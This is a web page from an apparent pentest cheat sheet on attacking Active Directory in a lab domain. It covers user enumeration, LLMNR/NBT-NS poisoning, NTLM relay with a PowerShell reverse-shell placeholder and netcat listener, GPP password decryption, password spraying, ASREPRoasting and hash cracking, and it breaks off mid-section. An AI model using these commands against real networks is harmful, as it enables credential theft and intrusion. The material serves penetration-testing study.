<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset='utf-8'>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="/assets/css/style.css?v=">
    <link rel="stylesheet" href="../assets/css/style.css">
    <link rel="stylesheet" href="/assets/css/style.css">

    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->

<!-- Setup theme-color -->
<!-- start theme color meta headers -->
<meta name="theme-color" content="#151515">
<meta name="msapplication-navbutton-color" content="#151515">
<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
<!-- end theme color meta headers -->


<!-- Setup Google Analytics -->



<!-- You can set your favicon here -->
<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->

<!-- end custom head snippets -->


<!-- Begin Jekyll SEO tag v2.8.0 -->
<title>Pentest CheatSheet | Pentest CheatSheet</title>
<meta name="generator" content="Jekyll v3.10.0" />
<meta property="og:title" content="Pentest CheatSheet" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Pentest CheatSheet" />
<meta property="og:description" content="Pentest CheatSheet" />
<link rel="canonical" href="http://localhost:4000/zNew/ActiveDirectory/ActiveDirectory.html" />
<meta property="og:url" content="http://localhost:4000/zNew/ActiveDirectory/ActiveDirectory.html" />
<meta property="og:site_name" content="Pentest CheatSheet" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Pentest CheatSheet" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"WebPage","description":"Pentest CheatSheet","headline":"Pentest CheatSheet","url":"http://localhost:4000/zNew/ActiveDirectory/ActiveDirectory.html"}</script>
<!-- End Jekyll SEO tag -->

  </head>

  <body>
    <header>
      <div class="container">
        <a id="a-title" href="/">
          <h1>Pentest CheatSheet</h1>
        </a>
        <h2>Pentest CheatSheet</h2>

        <section id="downloads">
          
          <a href="" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
        </section>
      </div>
    </header>

    <div class="container">
      <section id="main_content">
        <blockquote>
  <p>There is no “one way”, we need to go back and furth in the phases, roll back to the first one even with valid credentials, skip one and comeback later to it, etc…
The important thing is to make sure if stuck is to check all step done till the point where got stuck.</p>
</blockquote>

<h1 id="no-credentials">No Credentials</h1>
<h2 id="domain-enumeration">Domain Enumeration</h2>
<h3 id="identifying-hosts">Identifying Hosts</h3>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-E</span> wireshark

<span class="nv">$ </span><span class="nb">sudo </span>tcpdump <span class="nt">-i</span> ens224 

<span class="nv">$ </span><span class="nb">sudo </span>responder <span class="nt">-I</span> ens224 <span class="nt">-A</span> 

<span class="nv">$ </span>fping <span class="nt">-asgq</span> 172.16.5.0/23
</code></pre></div></div>

<h2 id="scan-alive-hosts">Scan Alive hosts</h2>
<p>Check <a href="../Enumeration/Discovery/Nmap.md">nmap</a></p>

<blockquote>
  <p>Focus on standard protocols typically seen accompanying AD services, such as DNS, SMB, LDAP, and Kerberos to find DC ip.</p>
</blockquote>

<h2 id="making-a-target-user-list">Making a Target User List</h2>

<ul>
  <li>By leveraging an SMB NULL session to retrieve a complete list of domain users from the domain controller</li>
  <li>Utilizing an LDAP anonymous bind to query LDAP anonymously and pull down the domain user list</li>
  <li>Using a tool such as Kerbrute to validate users utilizing a word list from a source such as the statistically-likely-usernames GitHub repo, or gathered by using a tool such as linkedin2username to create a list of potentially valid users</li>
  <li>Using a set of credentials from a Linux or Windows attack system either provided by our client or obtained through another means such as LLMNR/NBT-NS response poisoning using Responder or even a successful password spray using a smaller wordlist</li>
</ul>

<h3 id="smb-null-session-to-pull-user-list">SMB NULL Session to Pull User List</h3>
<p>If you are on an internal machine but don’t have valid domain credentials, you can look for SMB NULL sessions or LDAP anonymous binds on Domain Controllers. Either of these will allow you to obtain an accurate list of all users within Active Directory and the password policy. If you already have credentials for a domain user or SYSTEM access on a Windows host, then you can easily query Active Directory for this information.</p>

<p>It’s possible to do this using the SYSTEM account because it can impersonate the computer. A computer object is treated as a domain user account (with some differences, such as authenticating across forest trusts). If you don’t have a valid domain account, and SMB NULL sessions and LDAP anonymous binds are not possible, you can create a user list using external resources such as email harvesting and LinkedIn. This user list will not be as complete, but it may be enough to provide you with access to Active Directory.</p>

<p>Some tools that can leverage SMB NULL sessions and LDAP anonymous binds include enum4linux, rpcclient, and CrackMapExec, among others. Regardless of the tool, we’ll have to do a bit of filtering to clean up the output and obtain a list of only usernames, one on each line. We can do this with enum4linux with the -U flag.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Using enum4linux</span>
<span class="nv">$ </span>enum4linux <span class="nt">-U</span> 172.16.5.5  | <span class="nb">grep</span> <span class="s2">"user:"</span> | <span class="nb">cut</span> <span class="nt">-f2</span> <span class="nt">-d</span><span class="s2">"["</span> | <span class="nb">cut</span> <span class="nt">-f1</span> <span class="nt">-d</span><span class="s2">"]"</span>

<span class="c"># Using rpcclient</span>
<span class="nv">$ </span>rpcclient <span class="nt">-U</span> <span class="s2">""</span> <span class="nt">-N</span> 172.16.5.5
rpcclient <span class="nv">$&gt;</span> enumdomusers 

<span class="c"># Using CrackMapExec</span>
<span class="nv">$ </span>crackmapexec smb 172.16.5.5 <span class="nt">--users</span>
<span class="nv">$ </span><span class="nb">awk</span> <span class="s1">'{ print $5 }'</span> users.txt | <span class="nb">cut</span> <span class="nt">-d</span><span class="s1">'\'</span> <span class="nt">-f2</span> <span class="o">&gt;&gt;</span> validusers.txt
</code></pre></div></div>

<h3 id="gathering-users-with-ldap-anonymous">Gathering Users with LDAP Anonymous</h3>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Using ldapsearch</span>
<span class="nv">$ </span>ldapsearch <span class="nt">-h</span> 172.16.5.5 <span class="nt">-x</span> <span class="nt">-b</span> <span class="s2">"DC=INLANEFREIGHT,DC=LOCAL"</span> <span class="nt">-s</span> sub <span class="s2">"(&amp;(objectclass=user))"</span>  | <span class="nb">grep </span>sAMAccountName: | <span class="nb">cut</span> <span class="nt">-f2</span> <span class="nt">-d</span><span class="s2">" "</span>


<span class="c">## Using windapsearch</span>

<span class="nv">$ </span>./windapsearch.py <span class="nt">--dc-ip</span> 172.16.5.5 <span class="nt">-u</span> <span class="s2">""</span> <span class="nt">-U</span>
</code></pre></div></div>

<h3 id="enumerating-users-with-kerbrute">Enumerating Users with Kerbrute</h3>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>kerbrute userenum <span class="nt">-d</span> INLANEFREIGHT.LOCAL <span class="nt">--dc</span> 172.16.5.5 jsmith.txt <span class="nt">-o</span> valid_ad_users

<span class="nb">grep</span> <span class="nt">-o</span> <span class="s1">'[a-zA-Z0-9._%+-]\+@[a-zA-Z0-9.-]\+\.[a-zA-Z]\{2,6\}'</span> kerb.txt
<span class="nb">cut</span> <span class="nt">-d</span> <span class="s2">"@"</span> <span class="nt">-f</span> 1 your_file.txt
</code></pre></div></div>

<p>If we are unable to create a valid username list using any of the methods highlighted above, we could turn back to external information gathering and search for company email addresses or use a tool such as linkedin2username to mash up possible usernames from a company’s LinkedIn page.</p>

<hr />

<h2 id="llmnrnbt-ns-poisoning">LLMNR/NBT-NS Poisoning</h2>
<p>Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification that can be used when DNS fails. If a machine attempts to resolve a host but DNS resolution fails, typically, the machine will try to ask all other machines on the local network for the correct host address via LLMNR. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. It uses port 5355 over UDP natively. If LLMNR fails, the NBT-NS will be used. NBT-NS identifies systems on a local network by their NetBIOS name. NBT-NS utilizes port 137 over UDP.</p>

<p>The kicker here is that when LLMNR/NBT-NS are used for name resolution, ANY host on the network can reply. This is where we come in with Responder to poison these requests. With network access, we can spoof an authoritative name resolution source ( in this case, a host that’s supposed to belong in the network segment ) in the broadcast domain by responding to LLMNR and NBT-NS traffic as if they have an answer for the requesting host. This poisoning effort is done to get the victims to communicate with our system by pretending that our rogue system knows the location of the requested host. If the requested host requires name resolution or authentication actions, we can capture the NetNTLM hash and subject it to an offline brute force attack in an attempt to retrieve the cleartext password. The captured authentication request can also be relayed to access another host or used against a different protocol (such as LDAP) on the same host. LLMNR/NBNS spoofing combined with a lack of SMB signing can often lead to administrative access on hosts within a domain. SMB Relay attacks will be covered in a later module about Lateral Movement.</p>

<h3 id="responder-httpsgithubcomlgandxresponder">[Responder] (https://github.com/lgandx/Responder)</h3>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>responder <span class="nt">-I</span> ens224 
<span class="nv">$ </span><span class="nb">sudo </span>responder <span class="nt">-I</span> ens224 <span class="nt">-w</span> <span class="nt">-d</span>
</code></pre></div></div>

<p>/usr/share/responder/logs</p>

<h3 id="inveigh"><a href="https://github.com/Kevin-Robertson/Inveigh/blob/master/Inveigh.ps1">Inveigh</a></h3>
<p>If we end up with a Windows host as our attack box, our client provides us with a Windows box to test from, or we land on a Windows host as a local admin via another attack method and would like to look to further our access, the tool Inveigh works similar to Responder</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Import-Module</span><span class="w"> </span><span class="o">.</span><span class="nx">\Inveigh.ps1</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="p">(</span><span class="n">Get-Command</span><span class="w"> </span><span class="nx">Invoke-Inveigh</span><span class="p">)</span><span class="o">.</span><span class="nf">Parameters</span><span class="w">

</span><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Invoke-Inveigh</span><span class="w"> </span><span class="nx">Y</span><span class="w"> </span><span class="nt">-NBNS</span><span class="w"> </span><span class="nx">Y</span><span class="w"> </span><span class="nt">-ConsoleOutput</span><span class="w"> </span><span class="nx">Y</span><span class="w"> </span><span class="nt">-FileOutput</span><span class="w"> </span><span class="nx">Y</span><span class="w">
</span></code></pre></div></div>

<h3 id="c-inveigh-inveighzero"><a href="https://github.com/Kevin-Robertson/Inveigh/tree/master">C# Inveigh (InveighZero)</a></h3>

<p>Press ESC to enter/exit
help</p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="o">.</span><span class="nx">\Inveigh.exe</span><span class="w">
</span></code></pre></div></div>

<p>If a NTLM hash is found, next step will be to crack it offline using hashcat.</p>

<h3 id="cracking-an-ntlmv2-hash-with-hashcat">Cracking an NTLMv2 Hash With Hashcat</h3>
<p>Check <a href="../BruteForce/BruteForce.md#Hashcat">BruteForce</a></p>

<h3 id="relay">Relay</h3>
<p>If we cannot crack the hash, we can potentially relay the captured hash to another machine using impacket-ntlmrelayx or Responder MultiRelay.py. Let us see an example using impacket-ntlmrelayx.</p>

<p>First, we need to set SMB to OFF in our responder configuration file (/etc/responder/Responder.conf).</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cat /etc/responder/Responder.conf | grep 'SMB ='
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>impacket-ntlmrelayx <span class="nt">--no-http-server</span> <span class="nt">-smb2support</span> <span class="nt">-t</span> 10.10.110.146

<span class="nv">$ </span>impacket-ntlmrelayx <span class="nt">--no-http-server</span> <span class="nt">-smb2support</span> <span class="nt">-t</span> 192.168.220.146 <span class="nt">-c</span> <span class="s1">'powershell -e &lt;revshell&gt; '</span>

<span class="nv">$ </span>nc <span class="nt">-lvnp</span> 9001
</code></pre></div></div>

<hr />

<h2 id="low-hanging-fruits">Low Hanging Fruits</h2>
<h3 id="zerologon">ZeroLogon</h3>

<h3 id="credentials-in-smb-shares-and-sysvol-scripts">Credentials in SMB Shares and SYSVOL Scripts</h3>
<p>The SYSVOL share can be a treasure trove of data, especially in large organizations. We may find many different batch, VBScript, and PowerShell scripts within the scripts directory, which is readable by all authenticated users in the domain. It is worth digging around this directory to hunt for passwords stored in scripts. Sometimes we will find very old scripts containing since disabled accounts or old passwords, but from time to time, we will strike gold, so we should always dig through this directory. Here, we can see an interesting script named reset_local_admin_pass.vbs.</p>

<h4 id="discovering">Discovering</h4>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS &gt; ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts
</code></pre></div></div>

<h3 id="group-policy-preferences-gpp-passwords">Group Policy Preferences (GPP) Passwords</h3>
<p>When a new GPP is created, an .xml file is created in the SYSVOL share, which is also cached locally on endpoints that the Group Policy applies to. These files can include those used to:</p>

<ul>
  <li>Map drives (drives.xml)</li>
  <li>Create local users</li>
  <li>Create printer config files (printers.xml)</li>
  <li>Creating and updating services (services.xml)</li>
  <li>Creating scheduled tasks (scheduledtasks.xml)</li>
  <li>Changing local admin passwords.</li>
  <li>These files can contain an array of configuration data and defined passwords. The cpassword attribute value is AES-256 bit encrypted, but Microsoft published the AES private key on MSDN, which can be used to decrypt the password. Any domain user can read these files as they are stored on the SYSVOL share, and all authenticated users in a domain, by default, have read access to this domain controller share.</li>
</ul>

<p>This was patched in 2014 MS14-025 Vulnerability in GPP could allow elevation of privilege, to prevent administrators from setting passwords using GPP. The patch does not remove existing Groups.xml files with passwords from SYSVOL. If you delete the GPP policy instead of unlinking it from the OU, the cached copy on the local computer remains.</p>

<h4 id="locating--retrieving-gpp-passwords-with-crackmapexec">Locating &amp; Retrieving GPP Passwords with CrackMapExec</h4>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>crackmapexec smb <span class="nt">-L</span> | <span class="nb">grep </span>gpp
</code></pre></div></div>

<h4 id="decrypting-the-password-with-gpp-decrypt">Decrypting the Password with gpp-decrypt</h4>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE
</code></pre></div></div>

<p>GPP passwords can be located by searching or manually browsing the SYSVOL share or using tools such as Get-GPPPassword.ps1, the GPP Metasploit Post Module, and other Python/Ruby scripts which will locate the GPP and return the decrypted cpassword value. CrackMapExec also has two modules for locating and retrieving GPP passwords. One quick tip to consider during engagements: Often, GPP passwords are defined for legacy accounts, and you may therefore retrieve and decrypt the password for a locked or deleted account. However, it is worth attempting to password spray internally with this password (especially if it is unique). Password re-use is widespread, and the GPP password combined with password spraying could result in further access.</p>

<hr />

<h1 id="clear-text-password">Clear Text Password</h1>
<h2 id="check-for-password-reuse">Check for Password Reuse</h2>
<p>{ldap,mssql,smb,ssh,winrm}</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>crackmapexec &lt;protocol&gt; hosts.lst <span class="nt">-u</span> &lt;username&gt; <span class="nt">-p</span> &lt;password&gt;
</code></pre></div></div>

<hr />

<h2 id="enumerating-the-password-policy">Enumerating the Password Policy</h2>
<ul>
  <li>With valid domain credentials, the password policy can also be obtained remotely using tools such as CrackMapExec or rpcclient.</li>
</ul>

<h3 id="linux">Linux</h3>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>crackmapexec smb &lt;DC_IP&gt; <span class="nt">-u</span> &lt;USERNAME&gt; <span class="nt">-p</span> &lt;PASSWORD&gt; <span class="nt">--pass-pol</span>
</code></pre></div></div>

<h4 id="smb-null-sessions">SMB NULL Sessions</h4>
<p>SMB NULL sessions allow an unauthenticated attacker to retrieve information from the domain, such as a complete listing of users, groups, computers, user account attributes, and the domain password policy. SMB NULL session misconfigurations are often the result of legacy Domain Controllers being upgraded in place, ultimately bringing along insecure configurations, which existed by default in older versions of Windows Server.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Using rpcclient</span>
<span class="nv">$ </span>rpcclient <span class="nt">-U</span> <span class="s2">""</span> <span class="nt">-N</span> &lt;DC&gt;
rpcclient <span class="nv">$&gt;</span> querydominfo <span class="c"># check SMB for more queries</span>


<span class="c"># Using enum4linux</span>
<span class="nv">$ </span>enum4linux <span class="nt">-P</span> &lt;DC&gt;


<span class="c"># Using enum4linux-ng</span>
<span class="nv">$ </span>enum4linux-ng <span class="nt">-P</span> &lt;DC&gt; <span class="nt">-oA</span> &lt;FILE&gt;
<span class="nv">$ </span><span class="nb">cat</span> &lt;FILE&gt;.json 


<span class="c"># LDAP Anonymous Bind</span>
<span class="nv">$ </span>ldapsearch <span class="nt">-h</span> &lt;DC&gt; <span class="nt">-x</span> <span class="nt">-b</span> <span class="s2">"DC=INLANEFREIGHT,DC=LOCAL"</span> <span class="nt">-s</span> sub <span class="s2">"*"</span> | <span class="nb">grep</span> <span class="nt">-m</span> 1 <span class="nt">-B</span> 10 pwdHistoryLength
</code></pre></div></div>

<h3 id="windows">Windows</h3>
<h4 id="enumerating-null-session">Enumerating Null Session</h4>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">&gt;</span><span class="w"> </span><span class="n">net</span><span class="w"> </span><span class="nx">use</span><span class="w"> </span><span class="nx">\\DC01\ipc</span><span class="err">$</span><span class="w"> </span><span class="s2">""</span><span class="w"> </span><span class="nx">/u:</span><span class="s2">""</span><span class="w">

</span><span class="c"># Using net.exe</span><span class="w">
</span><span class="err">&gt;</span><span class="w"> </span><span class="n">net</span><span class="w"> </span><span class="nx">accounts</span><span class="w">

</span><span class="c"># Using PowerView</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">import-module</span><span class="w"> </span><span class="o">.</span><span class="nx">\PowerView.ps1</span><span class="w">
</span><span class="err">&gt;</span><span class="w"> </span><span class="n">Get-DomainPolicy</span><span class="w">
</span></code></pre></div></div>

<hr />

<h2 id="password-spraying">Password Spraying</h2>
<p>Password spraying can result in gaining access to systems and potentially gaining a foothold on a target network. The attack involves attempting to log into an exposed service using one common password and a longer list of usernames or email addresses. The usernames and emails may have been gathered during the OSINT phase of the penetration test or our initial enumeration attempts. Remember that a penetration test is not static, but we are constantly iterating through several techniques and repeating processes as we uncover new data. Often we will be working in a team or executing multiple TTPs at once to utilize our time effectively. As we progress through our career, we will find that many of our tasks like scanning, attempting to crack hashes, and others take quite a bit of time. We need to make sure we are using our time effectively and creatively because most assessments are time-boxed. So while we have our poisoning attempts running, we can also utilize the info we have to attempt to gain access via Password Spraying. Now let’s cover some of the considerations for Password spraying and how to make our target list from the information we have.</p>

<h3 id="linux-1">Linux</h3>
<p>Now that we have created a wordlist using one of the methods outlined in the previous sections, it’s time to execute our attack. The following sections will let us practice Password Spraying from Linux and Windows hosts. This is a key focus for us as it is one of two main avenues for gaining domain credentials for access, but one that we also must proceed with cautiously.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Using a Bash one-liner</span>
<span class="nv">$for</span> u <span class="k">in</span> <span class="si">$(</span><span class="nb">cat </span>valid_users.txt<span class="si">)</span><span class="p">;</span><span class="k">do </span>rpcclient <span class="nt">-U</span> <span class="s2">"</span><span class="nv">$u</span><span class="s2">%Welcome1"</span> <span class="nt">-c</span> <span class="s2">"getusername;quit"</span> 172.16.5.5 | <span class="nb">grep </span>Authority<span class="p">;</span> <span class="k">done</span>

<span class="c"># Using Kerbrute </span>
<span class="nv">$ </span>kerbrute passwordspray <span class="nt">-d</span> inlanefreight.local <span class="nt">--dc</span> 172.16.5.5 valid_users.txt  Welcome1


<span class="c"># Using CrackMapExec </span>
<span class="nv">$ </span><span class="nb">sudo </span>crackmapexec smb 172.16.5.5 <span class="nt">-u</span> valid_users.txt <span class="nt">-p</span> Password123 | <span class="nb">grep</span> +
<span class="nv">$ </span><span class="nb">sudo </span>crackmapexec smb 172.16.5.5 <span class="nt">-u</span> valid_users.txt <span class="nt">-p</span> password.txt <span class="nt">--no-bruteforce</span>| <span class="nb">grep</span> + 

<span class="c">## Validating the Credentials with CrackMapExec</span>
<span class="nv">$ </span><span class="nb">sudo </span>crackmapexec smb 172.16.5.5 <span class="nt">-u</span> avazquez <span class="nt">-p</span> Password123

<span class="c">## Local Administrator Password Reuse</span>
<span class="nv">$ </span><span class="nb">sudo </span>crackmapexec smb <span class="nt">--local-auth</span> 172.16.5.0/23 <span class="nt">-u</span> administrator <span class="nt">-H</span> 88ad09182de639ccc6579eb0849751cf | <span class="nb">grep</span> +
</code></pre></div></div>

<h3 id="windows-1">Windows</h3>
<h4 id="using-domainpasswordsprayps1">Using DomainPasswordSpray.ps1</h4>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Import-Module</span><span class="w"> </span><span class="o">.</span><span class="nx">\DomainPasswordSpray.ps1</span><span class="w">
</span><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Invoke-DomainPasswordSpray</span><span class="w"> </span><span class="nt">-Password</span><span class="w"> </span><span class="nx">Welcome1</span><span class="w"> </span><span class="nt">-OutFile</span><span class="w"> </span><span class="nx">spray_success</span><span class="w"> </span><span class="nt">-ErrorAction</span><span class="w"> </span><span class="nx">SilentlyContinue</span><span class="w">
</span></code></pre></div></div>

<hr />

<h2 id="asreproasting">ASREPRoasting</h2>
<p>It’s possible to obtain the Ticket Granting Ticket (TGT) for any account that has the Do not require Kerberos pre-authentication setting enabled. Many vendor installation guides specify that their service account be configured in this way. The authentication service reply (AS_REP) is encrypted with the account’s password, and any domain user can request it.</p>

<p>With pre-authentication, a user enters their password, which encrypts a time stamp. The Domain Controller will decrypt this to validate that the correct password was used. If successful, a TGT will be issued to the user for further authentication requests in the domain. If an account has pre-authentication disabled, an attacker can request authentication data for the affected account and retrieve an encrypted TGT from the Domain Controller. This can be subjected to an offline password attack using a tool such as Hashcat or John the Ripper.</p>

<p>ASREPRoasting is similar to Kerberoasting, but it involves attacking the AS-REP instead of the TGS-REP. An SPN is not required. This setting can be enumerated with PowerView or built-in tools such as the PowerShell AD module.
The attack itself can be performed with the Rubeus toolkit and other tools to obtain the ticket for the target account. If an attacker has GenericWrite or GenericAll permissions over an account, they can enable this attribute and obtain the AS-REP ticket for offline cracking to recover the account’s password before disabling the attribute again. Like Kerberoasting, the success of this attack depends on the account having a relatively weak password.</p>

<p>Below is an example of the attack. PowerView can be used to enumerate users with their UAC value set to DONT_REQ_PREAUTH.</p>

<h3 id="enumerating-for-dont_req_preauth-value-using-get-domainuser">Enumerating for DONT_REQ_PREAUTH Value using Get-DomainUser</h3>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Get-DomainUser</span><span class="w"> </span><span class="nt">-PreauthNotRequired</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nx">samaccountname</span><span class="p">,</span><span class="nx">userprincipalname</span><span class="p">,</span><span class="nx">useraccountcontrol</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">fl</span><span class="w">
</span></code></pre></div></div>

<p>With this information in hand, the Rubeus tool can be leveraged to retrieve the AS-REP in the proper format for offline hash cracking. This attack does not require any domain user context and can be done by just knowing the SAM name for the user without Kerberos pre-auth. We will see an example of this using Kerbrute later in this section. Remember, add the /nowrap flag so the ticket is not column wrapped and is retrieved in a format that we can readily feed into Hashcat.</p>

<h3 id="retrieving-as-rep-in-proper-format-using-rubeus">Retrieving AS-REP in Proper Format using Rubeus</h3>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">PS</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="o">.</span><span class="nx">\Rubeus.exe</span><span class="w"> </span><span class="nx">asreproast</span><span class="w"> </span><span class="nx">/user:</span><span class="err">&lt;</span><span class="nx">USERNAME</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/nowrap</span><span class="w"> </span><span class="nx">/format:</span><span class="err">&lt;</span><span class="nx">hashcat</span><span class="o">|</span><span class="n">john</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/outfile:</span><span class="err">&lt;</span><span class="nx">output_hashes_file</span><span class="err">&gt;</span><span class="w">
</span></code></pre></div></div>

<p>When performing user enumeration with Kerbrute, the tool will automatically retrieve the AS-REP for any users found that do not require Kerberos pre-authentication.</p>

<h3 id="retrieving-the-as-rep-using-kerbrute">Retrieving the AS-REP Using Kerbrute</h3>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>kerbrute userenum <span class="nt">-d</span> inlanefreight.local <span class="nt">--dc</span> 172.16.5.5 /opt/jsmith.txt 
</code></pre></div></div>
<p>With a list of valid users, we can use Get-NPUsers.py from the Impacket toolkit to hunt for all users with Kerberos pre-authentication not required. The tool will retrieve the AS-REP in Hashcat format for offline cracking for any found. We can also feed a wordlist such as jsmith.txt into the tool, it will throw errors for users that do not exist, but if it finds any valid ones without Kerberos pre-authentication, then it can be a nice way to obtain a foothold or further our access, depending on where we are in the course of our assessment. Even if we are unable to crack the AS-REP using Hashcat it is still good to report this as a finding to clients (just lower risk if we cannot crack the password) so they can assess whether or not the account requires this setting.</p>

<h3 id="hunting-for-users-with-kerberoast-pre-auth-not-required">Hunting for Users with Kerberoast Pre-auth Not Required</h3>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>GetNPUsers.py INLANEFREIGHT.LOCAL/ <span class="nt">-dc-ip</span> 172.16.5.5 <span class="nt">-no-pass</span> <span class="nt">-usersfile</span> valid_ad_users 

<span class="c"># check ASREPRoast for all domain users (credentials required)</span>
<span class="nv">$ </span>python GetNPUsers.py &lt;domain_name&gt;/&lt;domain_user&gt;:&lt;domain_user_password&gt; <span class="nt">-request</span> <span class="nt">-format</span> &lt;AS_REP_responses_format <span class="o">[</span>hashcat | john]&gt; <span class="nt">-outputfile</span> &lt;output_AS_REP_responses_file&gt;

<span class="c"># check ASREPRoast for a list of users (no credentials required)</span>
<span class="nv">$ </span>python GetNPUsers.py &lt;domain_name&gt;/ <span class="nt">-usersfile</span> &lt;users_file&gt; <span class="nt">-format</span> &lt;AS_REP_responses_format <span class="o">[</span>hashcat | john]&gt; <span class="nt">-outputfile</span> &lt;output_AS_REP_responses_file&gt;
</code></pre></div></div>

<p>We have now covered a few ways that we can perform an ASREPRoasting attack from both Windows and Linux hosts and witnessed how we do not need to be on a domain-joined host to a) enumerate accounts that do not require Kerberos pre-authentication and b) perform this attack and obtain an AS-REP to crack offline to either gain a foothold in the domain or further our access.</p>

<h2 id="cracking-the-hash-offline-with-hashcat">Cracking the Hash Offline with Hashcat</h2>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>hashcat <span class="nt">-m</span> 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt 
</code></pre></div></div>

<hr />

<h1 id="got-domain-account-with-valid-credentials-ticket-hash-or-password">Got Domain Account with valid credentials (Ticket, Hash or Password)</h1>
<h2 id="credentialed-enumeration">Credentialed Enumeration</h2>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Domain User Enumeration</span>
<span class="nv">$ </span><span class="nb">sudo </span>crackmapexec smb &lt;DC_IP&gt; <span class="nt">-u</span> &lt;USERNAME&gt; <span class="nt">-p</span> &lt;PASSWORD&gt; <span class="nt">--users</span>
<span class="nv">$ </span><span class="nb">awk</span> <span class="nt">-F</span> <span class="s1">'INLANEFREIGHT.LOCAL\\\\'</span> <span class="s1">'{print $2}'</span> crack.txt | <span class="nb">awk</span> <span class="s1">'{print $1}'</span> <span class="o">&gt;</span> new_crack.txt

<span class="nv">$ </span>crackmapexec smb &lt;DC_IP&gt; <span class="nt">-u</span> &lt;USERNAME&gt; <span class="nt">-p</span> &lt;PASSWORD&gt; <span class="nt">--users</span> <span class="o">&gt;&gt;</span> user.txt
<span class="nv">$ </span><span class="nb">awk</span> <span class="s1">'{ print $5 }'</span> users.txt | <span class="nb">cut</span> <span class="nt">-d</span><span class="s1">'\'</span> <span class="nt">-f2</span> <span class="o">&gt;&gt;</span> validusers.txt

<span class="nv">$ </span>GetADUsers.py <span class="nt">-all</span> <span class="nt">-dc-ip</span> &lt;dc_ip&gt; &lt;DOMAIN&gt;/&lt;USERNAME&gt; 

<span class="c"># Domain Group Enumeration</span>
<span class="nv">$ </span><span class="nb">sudo </span>crackmapexec smb &lt;DC_IP&gt; <span class="nt">-u</span> &lt;USERNAME&gt; <span class="nt">-p</span> &lt;PASSWORD&gt; <span class="nt">--groups</span>


<span class="c"># Logged On Users</span>
<span class="s2">"""
local admin because (Pwn3d!)
"""</span>
<span class="nv">$ </span><span class="nb">sudo </span>crackmapexec smb &lt;MACHINE_IP&gt; <span class="nt">-u</span> &lt;USERNAME&gt; <span class="nt">-p</span> &lt;PASSWORD&gt;2 <span class="nt">--loggedon-users</span>

<span class="c"># SMB shares </span>
Check SMB service 

<span class="c"># rpcclient</span>
Check SMB service 

<span class="c"># Windapsearch</span>
<span class="c">## Domain Admins</span>
